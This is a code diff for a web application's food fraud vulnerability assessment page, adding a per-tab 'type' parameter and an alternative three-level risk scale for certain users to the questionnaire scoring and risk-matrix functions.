-                                                                $selectConsequence = mysqli_query( $conn,"SELECT * FROM tbl_ffva_consequence" );
+                                                                $selectConsequence = mysqli_query( $conn,"SELECT * FROM tbl_ffva_consequence WHERE include IS NULL OR include = '' $sql_include" );
                                                                 if ( mysqli_num_rows($selectConsequence) > 0 ) {
                                                                     while($rowConsequence = mysqli_fetch_array($selectConsequence)) {
-                                                                        $sum += $consequence_rate_arr[$index];
+                                                                        $sum += !empty($consequence_rate_arr[$index]) ? $consequence_rate_arr[$index]:0;
                                                                         $index++;
                                                                         $count++;
                                                                     }
@@ -663,9 +672,9 @@
                                                                                 <a href="pdf/ffva?id='.$supplier_id.'&signed=1" class="btn btn-outline dark btn-sm" target="_blank" title="PDF"><i class="fa fa-fw fa-file-pdf-o"></i></a>
                                                                                 <a href="pdf_ffva_excel?id='.$supplier_id.'&signed=1" class="btn green-jungle btn-sm" target="_blank" title="Excel"><i class="fa fa-fw fa-file-excel-o"></i></a>
                                                                                 <a href="#modalView" class="btn dark btn-sm hide" data-toggle="modal" onclick="btnView('.$supplier_id.')" title="View"><i class="fa fa-fw fa-search"></i></a>
-                                                                                <a href="#modalEdit" class="btn btn-success btn-sm" data-toggle="modal" onclick="btnEdit('.$supplier_id.')" title="Edit"><i class="fa fa-fw fa-pencil"></i></a>
-                                                                                <a href="javascript:;" class="btn btn-danger btn-sm" data-toggle="modal" onclick="btnDelete('.$supplier_id.', 1)" title="Delete"><i class="fa fa-fw fa-trash"></i></a>
-                                                                                <a href="javascript:;" class="btn btn-info btn-sm" data-toggle="modal" onclick="btnArchive('.$supplier_id.', 1)" title="Archive"><i class="fa fa-fw fa-file-archive-o"></i></a>';
+                                                                                <a href="#modalEdit" class="btn btn-success btn-sm" data-toggle="modal" onclick="btnEdit('.$supplier_id.', 2)" title="Edit"><i class="fa fa-fw fa-pencil"></i></a>
+                                                                                <a href="javascript:;" class="btn btn-danger btn-sm" data-toggle="modal" onclick="btnDelete('.$supplier_id.', 2)" title="Delete"><i class="fa fa-fw fa-trash"></i></a>
+                                                                                <a href="javascript:;" class="btn btn-info btn-sm" data-toggle="modal" onclick="btnArchive('.$supplier_id.', 2)" title="Archive"><i class="fa fa-fw fa-file-archive-o"></i></a>';
 
                                                                                 if ($supplier_reviewed_by == $current_userID) {
                                                                                     echo '<a href="#modalSign" class="btn btn-danger btn-sm" data-toggle="modal" onclick="btnSign('.$supplier_id.', 1)"><i class="fa fa-fw fa-edit"></i></a>';
@@ -1825,7 +1834,7 @@
 
 
         <script type="text/javascript">
-
+            var switch_user_id = '<?php echo $switch_user_id; ?>';
             $(document).ready(function(){
 
                 fancyBoxes();
@@ -1926,35 +1935,21 @@
             }
 
             function btnNew_Activity(id) {
-
                 if (id == 1) { var nameOther = 'prevention'; }
-
                 else if (id == 2) { var nameOther = 'detection'; }
-
                 else if (id == 3) { var nameOther = 'mitigation'; }
-
-
 
                 var txtActivity = $("#txtActivity_"+id).val();
 
-
-
                 if (txtActivity != "") {
-
                     var html = '<label class="mt-checkbox mt-checkbox-outline"> '+txtActivity;
-
                         html += '<input type="checkbox" value="'+txtActivity+'" name="'+nameOther+'_other[]" checked />';
-
                         html += '<span></span>';
-
                     html += '</label>';
-
                     $('#list_activity_'+id).append(html);
-
                 }
-
             }
-            function btnNew_Questionaire(modal, id) {
+            function btnNew_Questionaire(modal, id, type) {
                 if (id == 1) { var nameOther = 'likelihood'; }
                 else if (id == 2) { var nameOther = 'consequence'; }
 
@@ -1969,11 +1964,11 @@
                         html += '<td>';
                             html += '<div class="mt-radio-list">';
                                 html += '<label class="mt-radio mt-radio-outline"> Yes';
-                                    html += '<input type="radio" value="1" name="'+nameOther+'_answer_other_'+x+'" onclick="questionaireAnswerOther('+modal+', '+id+', '+x+', 1, this)" required />';
+                                    html += '<input type="radio" value="1" name="'+nameOther+'_answer_other_'+x+'" onclick="questionaireAnswerOther('+modal+', '+id+', '+x+', 1, this, '+type+')" required />';
                                     html += '<span></span>';
                                 html += '</label>';
                                 html += '<label class="mt-radio mt-radio-outline"> No';
-                                    html += '<input type="radio" value="0" name="'+nameOther+'_answer_other_'+x+'" onclick="questionaireAnswerOther('+modal+', '+id+', '+x+', 0, this)" required />';
+                                    html += '<input type="radio" value="0" name="'+nameOther+'_answer_other_'+x+'" onclick="questionaireAnswerOther('+modal+', '+id+', '+x+', 0, this, '+type+')" required />';
                                     html += '<span></span>';
                                 html += '</label>';
                             html += '</div>';
@@ -1986,86 +1981,43 @@
                         html += '</td>';
                         html += '<td class="radioRate">';
                             html += '<div class="mt-radio-list">';
-                                html += '<label class="mt-radio mt-radio-outline"> 1 - Very Unlikely';
-                                    html += '<input type="radio" value="1" name="'+nameOther+'_rate_other_'+x+'" onclick="questionaireRateOther('+modal+', '+id+', '+x+', 1)" required />';
-                                    html += '<span></span>';
-                                html += '</label>';
-                                html += '<label class="mt-radio mt-radio-outline"> 2 - Unlikely';
-                                    html += '<input type="radio" value="2" name="'+nameOther+'_rate_other_'+x+'" onclick="questionaireRateOther('+modal+', '+id+', '+x+', 2)" required />';
-                                    html += '<span></span>';
-                                html += '</label>';
-                                html += '<label class="mt-radio mt-radio-outline"> 3 - Fairly Likely';
-                                    html += '<input type="radio" value="3" name="'+nameOther+'_rate_other_'+x+'" onclick="questionaireRateOther('+modal+', '+id+', '+x+', 3)" required />';
-                                    html += '<span></span>';
-                                html += '</label>';
-                                html += '<label class="mt-radio mt-radio-outline"> 4 - Likely';
-                                    html += '<input type="radio" value="4" name="'+nameOther+'_rate_other_'+x+'" onclick="questionaireRateOther('+modal+', '+id+', '+x+', 4)" required />';
-                                    html += '<span></span>';
-                                html += '</label>';
-                                html += '<label class="mt-radio mt-radio-outline"> 5 - Very Likely or Certain';
-                                    html += '<input type="radio" value="5" name="'+nameOther+'_rate_other_'+x+'" onclick="questionaireRateOther('+modal+', '+id+', '+x+', 5)" required />';
-                                    html += '<span></span>';
-                                html += '</label>';
-                            html += '</div>';
-                            html += '<input type="hidden" class="'+nameOther+'_rate" name="'+nameOther+'_rate_other[]" value="" />';
-                        html += '</td>';
-                        html += '<td class="text-center"><a href="javascript:;" class="btn btn-danger btn-circle" onclick="btnRemoveOther('+modal+', '+id+', '+x+')">Remove</a></td>';
-                    html += '</tr>';
-                    $('#tabdrop_'+modal+' .tableQuestionaire_'+id+' tbody').append(html);
-                }
-            }
-            function btnNew_Questionaire_Consequence(modal, id) {
-                if (id == 1) { var nameOther = 'likelihood'; }
-                else if (id == 2) { var nameOther = 'consequence'; }
 
-                let x = Math.floor((Math.random() * 100) + 1);
-                var questionaire_element = $('#tabdrop_'+modal+' .tableQuestionaire_'+id+' .'+nameOther+'_element').val();
-                var questionaire_question = $('#tabdrop_'+modal+' .tableQuestionaire_'+id+' .'+nameOther+'_question').val();
+                                if ((type == 1 || type == 2) && (switch_user_id == 1 || switch_user_id == 1211)) {
+                                    html += '<label class="mt-radio mt-radio-outline"> <b>1 - Low Risk</b>';
+                                        html += '<input type="radio" value="1" name="'+nameOther+'_rate_other_'+x+'" onclick="questionaireRateOther('+modal+', '+id+', '+x+', 1, '+type+')" required />';
+                                        html += '<span></span>';
+                                    html += '</label>'; 
+                                    html += '<label class="mt-radio mt-radio-outline"> <b>3 - Medium Risk</b>';
+                                        html += '<input type="radio" value="3" name="'+nameOther+'_rate_other_'+x+'" onclick="questionaireRateOther('+modal+', '+id+', '+x+', 3, '+type+')" required />';
+                                        html += '<span></span>';
+                                    html += '</label>';
+                                    html += '<label class="mt-radio mt-radio-outline"> <b>5 - High Risk</b>';
+                                        html += '<input type="radio" value="5" name="'+nameOther+'_rate_other_'+x+'" onclick="questionaireRateOther('+modal+', '+id+', '+x+', 5, '+type+')" required />';
+                                        html += '<span></span>';
+                                    html += '</label>';
+                                } else {
+                                    html += '<label class="mt-radio mt-radio-outline"> <b>1 - '; if (id == 1) { html += 'Very Unlikely'; } else { html += 'Negligible'; } html += '</b>';
+                                        html += '<input type="radio" value="1" name="'+nameOther+'_rate_other_'+x+'" onclick="questionaireRateOther('+modal+', '+id+', '+x+', 1, '+type+')" required />';
+                                        html += '<span></span>';
+                                    html += '</label>';
+                                    html += '<label class="mt-radio mt-radio-outline"> <b>2 - '; if (id == 1) { html += 'Unlikely'; } else { html += 'Minor'; } html += '</b>';
+                                        html += '<input type="radio" value="2" name="'+nameOther+'_rate_other_'+x+'" onclick="questionaireRateOther('+modal+', '+id+', '+x+', 2, '+type+')" required />';
+                                        html += '<span></span>';
+                                    html += '</label>';
+                                    html += '<label class="mt-radio mt-radio-outline"> <b>3 - '; if (id == 1) { html += 'Fairly Likely'; } else { html += 'Moderate'; } html += '</b>';
+                                        html += '<input type="radio" value="3" name="'+nameOther+'_rate_other_'+x+'" onclick="questionaireRateOther('+modal+', '+id+', '+x+', 3, '+type+')" required />';
+                                        html += '<span></span>';
+                                    html += '</label>';
+                                    html += '<label class="mt-radio mt-radio-outline"> <b>4 - '; if (id == 1) { html += 'Likely'; } else { html += 'Significant'; } html += '</b>';
+                                        html += '<input type="radio" value="4" name="'+nameOther+'_rate_other_'+x+'" onclick="questionaireRateOther('+modal+', '+id+', '+x+', 4, '+type+')" required />';
+                                        html += '<span></span>';
+                                    html += '</label>';
+                                    html += '<label class="mt-radio mt-radio-outline"> <b>5 - '; if (id == 1) { html += 'Very Likely or Certain'; } else { html += 'Severe'; } html += '</b>';
+                                        html += '<input type="radio" value="5" name="'+nameOther+'_rate_other_'+x+'" onclick="questionaireRateOther('+modal+', '+id+', '+x+', 5, '+type+')" required />';
+                                        html += '<span></span>';
+                                    html += '</label>';
+                                }
 
-                if (questionaire_element != "" && questionaire_question != "") {
-                    var html = '<tr class="tr_other_'+x+'">';
-                        html += '<td><input type="hidden" value="'+questionaire_element+'" name="'+nameOther+'_element_other[]" required />'+questionaire_element+'</td>';
-                        html += '<td><input type="hidden" value="'+questionaire_question+'" name="'+nameOther+'_question_other[]" required />'+questionaire_question+'</td>';
-                        html += '<td>';
-                            html += '<div class="mt-radio-list">';
-                                html += '<label class="mt-radio mt-radio-outline"> Yes';
-                                    html += '<input type="radio" value="1" name="'+nameOther+'_answer_other_'+x+'" onclick="questionaireAnswerOther('+modal+', '+id+', '+x+', 1, this)" required />';
-                                    html += '<span></span>';
-                                html += '</label>';
-                                html += '<label class="mt-radio mt-radio-outline"> No';
-                                    html += '<input type="radio" value="0" name="'+nameOther+'_answer_other_'+x+'" onclick="questionaireAnswerOther('+modal+', '+id+', '+x+', 0, this)" required />';
-                                    html += '<span></span>';
-                                html += '</label>';
-                            html += '</div>';
-                            html += '<input type="hidden" class="'+nameOther+'_answer" name="'+nameOther+'_answer_other[]" value="" />';
-                        html += '</td>';
-                        html += '<td>';
-                            html += '<textarea class="form-control" name="'+nameOther+'_comment_other[]" placeholder="Enter comment here"></textarea>';
-                            html += '<input type="file" class="form-control margin-top-15 hide" name="'+nameOther+'_file_other[]" />';
-                            html += '<p style="margin: 0;"><button type="button" class="btn btn-link uploadNew" onclick="uploadNew(this)">Upload File</button></p>';
-                        html += '</td>';
-                        html += '<td class="radioRate">';
-                            html += '<div class="mt-radio-list">';
-                                html += '<label class="mt-radio mt-radio-outline"> <b>1 - Negligible</b>';
-                                    html += '<input type="radio" value="1" name="'+nameOther+'_rate_other_'+x+'" onclick="questionaireRateOther('+modal+', '+id+', '+x+', 1)" required />';
-                                    html += '<span></span>';
-                                html += '</label>';
-                                html += '<label class="mt-radio mt-radio-outline"> <b>2 - Minor</b>';
-                                    html += '<input type="radio" value="2" name="'+nameOther+'_rate_other_'+x+'" onclick="questionaireRateOther('+modal+', '+id+', '+x+', 2)" required />';
-                                    html += '<span></span>';
-                                html += '</label>';
-                                html += '<label class="mt-radio mt-radio-outline"> <b>3 - Moderate</b>';
-                                    html += '<input type="radio" value="3" name="'+nameOther+'_rate_other_'+x+'" onclick="questionaireRateOther('+modal+', '+id+', '+x+', 3)" required />';
-                                    html += '<span></span>';
-                                html += '</label>';
-                                html += '<label class="mt-radio mt-radio-outline"> <b>4 - Significant</b>';
-                                    html += '<input type="radio" value="4" name="'+nameOther+'_rate_other_'+x+'" onclick="questionaireRateOther('+modal+', '+id+', '+x+', 4)" required />';
-                                    html += '<span></span>';
-                                html += '</label>';
-                                html += '<label class="mt-radio mt-radio-outline"> <b>5 - Severe</b>';
-                                    html += '<input type="radio" value="5" name="'+nameOther+'_rate_other_'+x+'" onclick="questionaireRateOther('+modal+', '+id+', '+x+', 5)" required />';
-                                    html += '<span></span>';
-                                html += '</label>';
                             html += '</div>';
                             html += '<input type="hidden" class="'+nameOther+'_rate" name="'+nameOther+'_rate_other[]" value="" />';
                         html += '</td>';
@@ -2080,7 +2032,7 @@
             function btnRemoveOther(modal, table, x) {
                 $('#tabdrop_'+modal+' .tableQuestionaire_'+table+' tbody .tr_other_'+x).remove();
             }
-            function questionaireAnswer(modal, table, id, val, e) {
+            function questionaireAnswer(modal, table, id, val, e, type) {
                 if (table == 1) { name = "likelihood"; }
                 else if (table == 2) { name = "consequence"; }
 
@@ -2090,13 +2042,13 @@
                 // if (val == 1) { $(e).parent().parent().parent().parent().find('.radioRate .mt-radio-list label input').removeAttr("disabled"); }
                 // else { $(e).parent().parent().parent().parent().find('.radioRate .mt-radio-list label:nth-child(n+2) input').attr('disabled', 'disabled'); }
 
-                questionaireRate(modal, table, id, 1);
+                questionaireRate(modal, table, id, 1, type);
 
                 // $(e).parent().parent().parent().hide();
                 // console.log(val);
                 // console.log(id);
             }
-            function questionaireAnswerOther(modal, table, id, val, e) {
+            function questionaireAnswerOther(modal, table, id, val, e, type) {
                 if (table == 1) { name = "likelihood"; }
                 else if (table == 2) { name = "consequence"; }
 
@@ -2106,9 +2058,9 @@
                 // if (val == 1) { $(e).parent().parent().parent().parent().find('.radioRate .mt-radio-list label input').removeAttr("disabled"); }
                 // else { $(e).parent().parent().parent().parent().find('.radioRate .mt-radio-list label:nth-child(n+2) input').attr('disabled', 'disabled'); }
 
-                questionaireRateOther(modal, table, id, 1);
+                questionaireRateOther(modal, table, id, 1, type);
             }
-            function questionaireRate(modal, table, id, val) {
+            function questionaireRate(modal, table, id, val, type) {
                 if (table == 1) { name = "likelihood"; }
                 else if (table == 2) { name = "consequence"; }
 
@@ -2117,148 +2069,126 @@
                 // console.log(table);
                 // console.log(id);
                 // console.log(val);
-                questionaireRateSummary(modal);
+                questionaireRateSummary(modal, type);
             }
-            function questionaireRateOther(modal, table, id, val) {
+            function questionaireRateOther(modal, table, id, val, type) {
                 if (table == 1) { name = "likelihood"; }
                 else if (table == 2) { name = "consequence"; }
 
                 $('#tabdrop_'+modal+' .tableQuestionaire_'+table+' tbody .tr_other_'+id+' .'+name+'_rate').val(val);
 
-                questionaireRateSummary(modal);
+                questionaireRateSummary(modal, type);
             }
-            function questionaireRateSummary(modal) {
+            function questionaireRateSummary(modal, type) {
                 for (var x = 1; x <= 2; x++) {
-                    if (x == 1) { name = "likelihood"; }
-                    else if (x == 2) { name = "consequence"; }
-
+                    var name = (x === 1) ? "likelihood" : "consequence";
                     var sum = 0;
-                    var total = 0;
-                    var result = 'Undefine';
-                    var inputs = $('#tabdrop_'+modal+' .tableQuestionaire_'+x+' .'+name+'_rate');
-                    for(var i = 0; i < inputs.length; i++){
-                        var number = $(inputs[i]).val();
-                        if($.isNumeric(number)) {
-                            sum = Math.round(sum) + Math.round(number);
+                    var validCount = 0;
+                    var result = 'Undefined';
+                
+                    var inputs = $('#tabdrop_' + modal + ' .tableQuestionaire_' + x + ' .' + name + '_rate');
+                
+                    for (var i = 0; i < inputs.length; i++) {
+                        var number = parseFloat($(inputs[i]).val());
+                        if ($.isNumeric(number)) {
+                            sum += number;          // Do NOT round here!
+                            validCount++;
                         }
                     }
-                    total = sum / inputs.length;
-
-                    if (x == 1) {
-                        if (Math.round(total) == 1) { result = "1 - Very Unlikely"; }
-                        else if (Math.round(total) == 2) { result = "2 - Unlikely"; }
-                        else if (Math.round(total) == 3) { result = "3 - Fairly Likely"; }
-                        else if (Math.round(total) == 4) { result = "4 - Likely"; }
-                        else if (Math.round(total) == 5) { result = "5 - Very Likely or Certain"; }
-                    } else if (x == 2) {
-                        if (Math.round(total) == 1) { result = "1 - Negligible"; }
-                        else if (Math.round(total) == 2) { result = "2 - Minor"; }
-                        else if (Math.round(total) == 3) { result = "3 - Moderate"; }
-                        else if (Math.round(total) == 4) { result = "4 - Significant"; }
-                        else if (Math.round(total) == 5) { result = "5 - Severe"; }
+                
+                    var total = (validCount > 0) ? sum / validCount : 0;
+                    var roundedTotal = Math.round(total);
+                
+                    console.log("Inputs:", validCount, "Sum:", sum, "Avg:", total, "Rounded:", roundedTotal);
+                
+                    if ((type == 1 || type == 2) && (switch_user_id == 1 || switch_user_id == 1211)) {
+                        if (x == 1) {
+                            if (roundedTotal === 1) result = "1 - Unlikely";
+                            else if (roundedTotal === 2) result = "2 - Likely";
+                            else if (roundedTotal === 3) result = "3 - Certain"; 
+                        } else {
+                            if (roundedTotal === 1) result = "1 - Low Risk"; 
+                            else if (roundedTotal === 2) result = "2 - Medium Risk";
+                            else if (roundedTotal === 3) result = "3 - High Risk"; 
+                        }
+                    } else {
+                        if (x == 1) {
+                            if (roundedTotal === 1) result = "1 - Very Unlikely";
+                            else if (roundedTotal === 2) result = "2 - Unlikely";
+                            else if (roundedTotal === 3) result = "3 - Fairly Likely";
+                            else if (roundedTotal === 4) result = "4 - Likely";
+                            else if (roundedTotal === 5) result = "5 - Very Likely or Certain";
+                        } else {
+                            if (roundedTotal === 1) result = "1 - Negligible";
+                            else if (roundedTotal === 2) result = "2 - Minor";
+                            else if (roundedTotal === 3) result = "3 - Moderate";
+                            else if (roundedTotal === 4) result = "4 - Significant";
+                            else if (roundedTotal === 5) result = "5 - Severe";
+                        }
                     }
-                    $('#tabdrop_'+modal+' .tableQuestionaire_'+x+' .'+name+'_result').html(result);
-                    $('#tabdrop_'+modal+' #tableMatrixData .'+name+'_result').html(result);
-
-                    // console.log(x);
-                    // console.log('modal:'+ modal);
-                    // console.log('total:'+ total);
-                    // console.log('sum:'+ sum);
-                    // console.log('inputs.length:'+ inputs.length);
-                    // console.log('name:'+ name);
-                    // console.log('result:'+ result);
+                
+                    $('#tabdrop_' + modal + ' .tableQuestionaire_' + x + ' .' + name + '_result').html(result);
+                    $('#tabdrop_' + modal + ' .tableMatrixData .' + name + '_result').html(result);
                 }
+                
+                console.log("x:", x);
+                console.log("Sum:", sum);
+                console.log("Inputs count:", inputs.length);
+                console.log("Average (total):", total);
+                console.log("Rounded Total:", roundedTotal);
 
-                questionaireMatrix();
+                questionaireMatrix(modal, type);
             }
-
-            function questionaireMatrix() {
+            function questionaireMatrix(modal, type) {
                 var x = 1;
-
                 var y = 1;
 
-
-
-                var likelihoodRateSummary = parseInt($('#tableMatrixData .likelihood_result').text());
-
-                var consequenceRateSummary = parseInt($('#tableMatrixData .consequence_result').text());
-
-
+                var likelihoodRateSummary = parseInt($('#tabdrop_'+modal+' .tableMatrixData .likelihood_result').text());
+                var consequenceRateSummary = parseInt($('#tabdrop_'+modal+' .tableMatrixData .consequence_result').text());
 
                 if (likelihoodRateSummary > 0) { x = likelihoodRateSummary; }
-
                 if (consequenceRateSummary > 0) { y = consequenceRateSummary; }
 
+                if ((type == 1 || type == 2) && (switch_user_id == 1 || switch_user_id == 1211) && x == 2) { x = 2; }
+                else if ((type == 1 || type == 2) && (switch_user_id == 1 || switch_user_id == 1211) && x == 3) { x = 3; }
+                if ((type == 1 || type == 2) && (switch_user_id == 1 || switch_user_id == 1211) && y == 2) { y = 2; }
+                else if ((type == 1 || type == 2) && (switch_user_id == 1 || switch_user_id == 1211) && y == 3) { y = 3; }
                 plot = y+"-"+x;
 
+                $('#tabdrop_'+modal+' .tableMatrix .fa').addClass('hidden');
+                $('#tabdrop_'+modal+' .tableMatrix tr .matrix-'+plot+' .fa').removeClass('hidden');
 
-
-                $('#tableMatrix .fa').addClass('hidden');
-
-                $('#tableMatrix tr .matrix-'+plot+' .fa').removeClass('hidden');
-
-
-
-                if (x == 1 && y == 1) { vulnerability = 1; }
-
+                if (x == 1 && y == 1) { vulnerability = 1; } 
                 else if (x == 1 && y == 2) { vulnerability = 1; }
-
                 else if (x == 1 && y == 3) { vulnerability = 1; }
-
                 else if (x == 1 && y == 4) { vulnerability = 2; }
-
                 else if (x == 1 && y == 5) { vulnerability = 2; }
-
                 else if (x == 2 && y == 1) { vulnerability = 1; }
-
                 else if (x == 2 && y == 2) { vulnerability = 1; }
-
                 else if (x == 2 && y == 3) { vulnerability = 2; }
-
                 else if (x == 2 && y == 4) { vulnerability = 2; }
-
                 else if (x == 2 && y == 5) { vulnerability = 3; }
-
                 else if (x == 3 && y == 1) { vulnerability = 2; }
-
                 else if (x == 3 && y == 2) { vulnerability = 2; }
-
                 else if (x == 3 && y == 3) { vulnerability = 2; }
-
                 else if (x == 3 && y == 4) { vulnerability = 3; }
-
                 else if (x == 3 && y == 5) { vulnerability = 3; }
-
                 else if (x == 4 && y == 1) { vulnerability = 2; }
-
                 else if (x == 4 && y == 2) { vulnerability = 2; }
-
                 else if (x == 4 && y == 3) { vulnerability = 3; }
-
                 else if (x == 4 && y == 4) { vulnerability = 3; }
-
                 else if (x == 4 && y == 5) { vulnerability = 3; }
-
                 else if (x == 5 && y == 1) { vulnerability = 3; }
-
                 else if (x == 5 && y == 2) { vulnerability = 3; }
-
                 else if (x == 5 && y == 3) { vulnerability = 3; }
-
                 else if (x == 5 && y == 4) { vulnerability = 3; }
-
                 else if (x == 5 && y == 5) { vulnerability = 3; }
 
                 if (vulnerability == 1) { vulnerability_result = "Low Risk"; }
-
                 else if (vulnerability == 2) { vulnerability_result = "Medium Risk: Action is needed with occasional monitoring to mitigate the risk."; }
-
                 else if (vulnerability == 3) { vulnerability_result = "High Risk: Urgent action is required and regular monitoring may be needed!"; }
 
-
-
-                $('#tableMatrixData .vulnerability_result').html(vulnerability_result);
-
+                $('.tableMatrixData .vulnerability_result').html(vulnerability_result);
             }
 
             function widget_signature() {
@@ -2326,13 +2256,12 @@
                     success: function(data){
                         $("#modalNew .modal-body").html(data);
                         $('.summernote').summernote({
-                            height: 100,
-                            width: 500
+                            height: 200
                         });
 
                         widget_signature();
                         selectMulti();
-                        questionaireRateSummary(1);
+                        questionaireRateSummary(1, id);
                     }
                 });
             }
@@ -2393,7 +2322,7 @@
                                         html += '<a href="pdf/ffva?id='+obj.ID+'&signed=1" class="btn btn-outline dark btn-sm" target="_blank" title="PDF"><i class="fa fa-fw fa-file-pdf-o"></i></a>';
                                         html += '<a href="pdf_ffva_excel?id='+obj.ID+'&signed=1" class="btn green-jungle btn-sm" target="_blank" title="Excel"><i class="fa fa-fw fa-file-excel-o"></i></a>';
                                         html += '<a href="#modalView" class="btn dark btn-sm hide" data-toggle="modal" onclick="btnView('+obj.ID+')" title="View"><i class="fa fa-fw fa-search"></i></a>';
-                                        html += '<a href="#modalEdit" class="btn btn-success btn-sm" data-toggle="modal" onclick="btnEdit('+obj.ID+')" title="Edit"><i class="fa fa-fw fa-pencil"></i></a>';
+                                        html += '<a href="#modalEdit" class="btn btn-success btn-sm" data-toggle="modal" onclick="btnEdit('+obj.ID+', '+obj.tab+')" title="Edit"><i class="fa fa-fw fa-pencil"></i></a>';
                                         html += '<a href="javascript:;" class="btn btn-danger btn-sm" data-toggle="modal" onclick="btnDelete('+obj.ID+', '+obj.tab+')" title="Delete"><i class="fa fa-fw fa-trash"></i></a>';
                                         html += '<a href="javascript:;" class="btn btn-info btn-sm" data-toggle="modal" onclick="btnArchive('+obj.ID+', '+obj.tab+')" title="Archive"><i class="fa fa-fw fa-file-archive-o"></i></a>';
                                     html += '</div>';
@@ -2410,7 +2339,7 @@
                     }
                 });
             }));
-            function btnEdit(id) {
+            function btnEdit(id, type) {
                 $.ajax({
                     type: "GET",
                     url: "function.php?modalEdit_FFVA="+id,
@@ -2418,13 +2347,12 @@
                     success: function(data){
                         $("#modalEdit .modal-body").html(data);
                         $('.summernote').summernote({
-                            height: 100,
-                            width: 500
+                            height: 200
                         });
 
-                        widget_signature();
+                        widget_signature(); 
                         selectMulti();
-                        questionaireRateSummary(2);
+                        questionaireRateSummary(2, type);
                     }
                 });
             }
@@ -2483,7 +2411,7 @@
                                         html += '<a href="pdf/ffva?id='+obj.ID+'&signed=1" class="btn btn-outline dark btn-sm" target="_blank" title="PDF"><i class="fa fa-fw fa-file-pdf-o"></i></a>';
                                         html += '<a href="pdf_ffva_excel?id='+obj.ID+'&signed=1" class="btn green-jungle btn-sm" target="_blank" title="Excel"><i class="fa fa-fw fa-file-excel-o"></i></a>';
                                         html += '<a href="#modalView" class="btn dark btn-sm hide" data-toggle="modal" onclick="btnView('+obj.ID+')" title="View"><i class="fa fa-fw fa-search"></i></a>';
-                                        html += '<a href="#modalEdit" class="btn btn-success btn-sm" data-toggle="modal" onclick="btnEdit('+obj.ID+')" title="Edit"><i class="fa fa-fw fa-pencil"></i></a>';
+                                        html += '<a href="#modalEdit" class="btn btn-success btn-sm" data-toggle="modal" onclick="btnEdit('+obj.ID+', '+obj.tab+')" title="Edit"><i class="fa fa-fw fa-pencil"></i></a>';
                                         html += '<a href="javascript:;" class="btn btn-danger btn-sm" data-toggle="modal" onclick="btnDelete('+obj.ID+', '+obj.tab+')" title="Delete"><i class="fa fa-fw fa-trash"></i></a>';
                                         html += '<a href="javascript:;" class="btn btn-info btn-sm" data-toggle="modal" onclick="btnArchive('+obj.ID+', '+obj.tab+')" title="Archive"><i class="fa fa-fw fa-file-archive-o"></i></a>';
                                     html += '</div>';
@@ -2623,7 +2551,7 @@
                                             html += '<a href="pdf/ffva?id='+obj.ID+'&signed=1" class="btn btn-outline dark btn-sm" target="_blank" title="PDF"><i class="fa fa-fw fa-file-pdf-o"></i></a>';
                                             html += '<a href="pdf_ffva_excel?id='+obj.ID+'&signed=1" class="btn green-jungle btn-sm" target="_blank" title="Excel"><i class="fa fa-fw fa-file-excel-o"></i></a>';
                                             html += '<a href="#modalView" class="btn dark btn-sm hide" data-toggle="modal" onclick="btnView('+obj.ID+')" title="View"><i class="fa fa-fw fa-search"></i></a>';
-                                            html += '<a href="#modalEdit" class="btn btn-success btn-sm" data-toggle="modal" onclick="btnEdit('+obj.ID+')" title="Edit"><i class="fa fa-fw fa-pencil"></i></a>';
+                                            html += '<a href="#modalEdit" class="btn btn-success btn-sm" data-toggle="modal" onclick="btnEdit('+obj.ID+', '+obj.tab+')" title="Edit"><i class="fa fa-fw fa-pencil"></i></a>';
                                             html += '<a href="javascript:;" class="btn btn-danger btn-sm" data-toggle="modal" onclick="btnDelete('+obj.ID+', '+obj.tab+')" title="Delete"><i class="fa fa-fw fa-trash"></i></a>';
                                             html += '<a href="javascript:;" class="btn btn-info btn-sm" data-toggle="modal" onclick="btnArchive('+obj.ID+', '+obj.tab+')" title="Archive"><i class="fa fa-fw fa-file-archive-o"></i></a>';
                                         html += '</div>';
@@ -2872,7 +2800,7 @@
                     $(e).parent().parent().parent().find('.signature_upload').removeClass('hide');
                 } else if (e.value == 3) {
                     $(e).parent().parent().parent().find('.sign').addClass('hide');
-                    $(e).parent().parent().parent().find('.frank_signature_default').removeClass('hide');
+                    $(e).parent().parent().parent().find('.client_signature_default').removeClass('hide');
                 } else {
                     $(e).parent().parent().parent().find('.sign').addClass('hide');
                     $(e).parent().parent().parent().find('.signature_default').removeClass('hide');
